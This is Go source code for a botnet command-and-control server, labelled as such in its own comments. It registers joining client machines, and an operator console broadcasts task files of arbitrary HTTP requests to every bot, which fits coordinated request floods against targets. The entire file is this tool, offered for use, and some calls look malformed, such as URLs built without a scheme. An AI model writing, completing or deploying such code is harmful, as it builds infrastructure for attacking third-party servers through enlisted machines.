package main

import (
	"bufio"
	"crypto/rand"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"io/ioutil"
	"log"
	"net/http"
	"net/url"
	"os"
	"strconv"
	"strings"
)

const (
	// ClientPort - This is the port where the client server is hosted on
	ClientPort = ":4600"

	// Version - This is the current version of the botnet the server is running on
	Version = "0.0.1"

	// ClientIDLen - This specifies how long the base64-encoded client ID will be
	ClientIDLen = 32
)

// Server - This is the server object. It stores all the data
// necessary for keeping track of the network and its clients
type Server struct {
	Clients map[string]Client
}

// HTTPRequest - My own HTTP struct, so I can serialize
// http requests
type HTTPRequest struct {
	Method string              `json:"Method"`
	Host   string              `json:"Host"` // this is in the format of ip:port
	Path   string              `json:"Path"`
	Header map[string][]string `json:"Header"`
	Body   []byte              `json:"Body"`
}

// Task - This contains the data pertaining to a certain task
// to be ran by the client
type Task struct {
	Requests []HTTPRequest `json:"Requests"`
}

// Client - Struct to store info about clients and their states
type Client struct {
	IP    string
	ID    string
	Tasks map[uint32]Task
}

// Request - Struct to store every attribute of a request. Put this into JSON
// into POST request and send it off the client to parse
type Request struct {
	Type          string
	ID            string
	Message       string // transmit a string message
	MessageBinary []byte // transmit binary data (encode to base64)
	Version       string
}

// GenerateRandomString - Used to generate a cryptographically-secure
// random string
func GenerateRandomString(n int) (string, error) {
	b := make([]byte, n)
	_, err := rand.Read(b)
	// Note that err == nil only if we read len(b) bytes.
	if err != nil {
		return "", err
	}

	randStr := base64.URLEncoding.EncodeToString(b)

	return randStr, nil
}

// SerializeTask - Takes in a pointer receiver of a task
// and serializes it using JSON
func (t *Task) SerializeTask() (string, error) {
	requestsSerialized, err := json.Marshal(t.Requests)
	if err != nil {
		return "", err
	}
	return string(requestsSerialized[:]), nil
}

// ParseRequest - Turns form values into request struct for ez access
func ParseRequest(r *http.Request) *Request {
	// Access form values
	rType := r.FormValue("Type")
	rID := r.FormValue("ID")
	rMessage := r.FormValue("Message")
	rMesssageBinaryUnparsed := r.FormValue("MessageBinary")
	rVersion := r.FormValue("Version")

	// Change necessary types into their correct types
	rMessageBinary, err := base64.URLEncoding.DecodeString(rMesssageBinaryUnparsed)
	if err != nil {
		return nil
	}

	// Use these to return an http.Request correctly
	return &Request{Type: rType, ID: rID, Message: rMessage, MessageBinary: rMessageBinary, Version: rVersion}
}

// HandleJoin - This is the API path used to handle a new client joining the network
func (s *Server) HandleJoin(w http.ResponseWriter, r *http.Request) {
	if r.Method == "POST" {
		// Add the client to the network
		id, err := GenerateRandomString(ClientIDLen)
		if err != nil {
			return
		}
		_clientIP := r.RemoteAddr
		clientIP := strings.Split(_clientIP, ":")[0]
		newClient := Client{IP: clientIP, ID: id, Tasks: make(map[uint32]Task)}
		s.Clients[id] = newClient

		// Send a response to the client
		// This response just assigns the client to an ID
		// by sending it a JOIN-RESP with the ID in the Message field
		http.PostForm(clientIP+ClientPort, url.Values{"Type": {"JOIN-RESP"}, "ID": {"0"},
			"Message": {id}, "MessageBinary": {""}, "Version": {"0.0.1"}})
	}
}

// HandleDone - Handle when a client tells us its done with a task
func (s *Server) HandleDone(w http.ResponseWriter, r *http.Request) {
	if r.Method == "POST" {
		requestData := ParseRequest(r)
		TaskIDsSplit := strings.Split(requestData.Message, ",")
		for _, doneTaskID := range TaskIDsSplit {
			doneTaskIDToUint64, err := strconv.ParseUint(doneTaskID, 10, 32)
			if err != nil {
				return
			}
			delete(s.Clients[requestData.ID].Tasks, uint32(doneTaskIDToUint64))
		}
	}
}

// HandleDisconnect - Handle a client disconnecting
func (s *Server) HandleDisconnect(w http.ResponseWriter, r *http.Request) {
	if r.Method == "POST" {
		requestData := ParseRequest(r)
		delete(s.Clients, requestData.ID)
	}
}

// UploadTask - Tell the server to upload a task to all the clients
func (s *Server) UploadTask(t *Task) error {
	for _, v := range s.Clients {
		tasksSerialized, err := t.SerializeTask()
		if err != nil {
			return err
		}
		http.PostForm(v.IP+ClientPort+"/uploadtask", url.Values{"Type": {"JOIN-RESP"}, "ID": {"0"},
			"Message": {tasksSerialized}, "MessageBinary": {""}, "Version": {"0.0.1"}})
	}

	return nil
}

// PrintHelp - prints the help message after typing in the help command into the terminal
func PrintHelp() {
	fmt.Printf("\n\n")
	fmt.Println("\t - help: Prints help message")
	fmt.Println("\t - quit: Terminates execution")
	fmt.Println("\t - upload-task: Uploads a task to all clients in the network")
	fmt.Println("\t\t - usage: upload-task <path-to-task-file>")
	fmt.Println("\t - list: List all clients")
	fmt.Println("\t - list-all: Lists all clients and their tasks")
	fmt.Println("\t - count: Prints out the number of currently-connected clients")
	fmt.Printf("\n\n")
}

// GetUserInput - Used to accept user commands
func GetUserInput(cwd string) string {
	reader := bufio.NewReader(os.Stdin)
	fmt.Printf("%s> ", cwd)
	command, err := reader.ReadString(byte('\n'))
	command = command[0 : len(command)-1]
	if err != nil {
		log.Println("[Error - Nonfatal] Unable to read stdin. If the error persists, ^C to terminate execution and restart the server.")
	}

	return command
}

// ListClients - Used to print all clients out to the command line
func (s *Server) ListClients() {
	count := 0
	for k, v := range s.Clients {
		fmt.Printf("\n\t[%d] ID: %s | IP: %s\n", count, k, v.IP)
		count++
	}
}

// ListClientsAll - Same as ListClients but displays more information
func (s *Server) ListClientsAll() {
	count := 0
	for k, v := range s.Clients {
		fmt.Printf("\n\t[%d] ID: %s | IP: %s\n", count, k, v.IP)
		fmt.Printf("\n\t%v\n", v.Tasks)
		count++
	}
}

// ParseTaskFile - Parse a file containing the JSON serialized version of a task
func ParseTaskFile(fpath string) (Task, error) {
	fdata, err := ioutil.ReadFile(fpath)
	if err != nil {
		return Task{}, err
	}
	var task Task
	err = json.Unmarshal(fdata, &task)
	if err != nil {
		return Task{}, err
	}
	return task, nil
}

// HandleUserInput - Used to handle user input from stdin
func (s *Server) HandleUserInput() {
	// Get the current working directory
	cwd, err := os.Getwd()
	if err != nil {
		log.Fatal("[Error - Fatal] Unable to get current working directory")
	}

	// Handle user input in this loop
	running := true
	for {
		// Check if the program is to be terminated here
		if running == false {
			break
		}

		// Read user-inputted command here
		command := GetUserInput(cwd)
		commandSplit := strings.Split(command, " ")
		switch commandSplit[0] {
		case "help":
			PrintHelp()
		case "quit":
			running = false
		case "list":
			s.ListClients()
		case "list-all":
			s.ListClientsAll()
		case "count":
			fmt.Printf("\tNumber of connected clients: %d\n", len(s.Clients))
		case "upload-task":
			if len(commandSplit) == 2 {
				task, err := ParseTaskFile(commandSplit[1])
				if err != nil {
					log.Println("[Error - Nonfatal]: Unable to deserialize requests from task file or read the task file itself.")
					log.Printf("\tError: %s\n", err.Error())
					log.Println("\tPlease fix the error and try again")
					continue
				}
				err = s.UploadTask(&task)
				if err != nil {
					log.Println("[Error - Nonfatal]: Unable to upload task.")
					log.Printf("\tError: %s\n", err.Error())
					log.Println("\tPlease fix the error and try again")
					continue
				}
			} else {
				log.Println("[Error - Nonfatal]: Incorrect command usage")
				log.Println("\tCorrect usage: upload-task <path-to-task-file>")
				continue
			}
		default:
			fmt.Printf("\nTry typing \"help\" in order to view the list of possible commands\n\n")
		}
	}
}

func main() {
	s := Server{Clients: make(map[string]Client)}
	http.HandleFunc("/join", s.HandleJoin)
	http.HandleFunc("/done", s.HandleDone)
	http.HandleFunc("/disconnect", s.HandleDisconnect)
	go http.ListenAndServe(":80", nil)
	s.HandleUserInput()
}
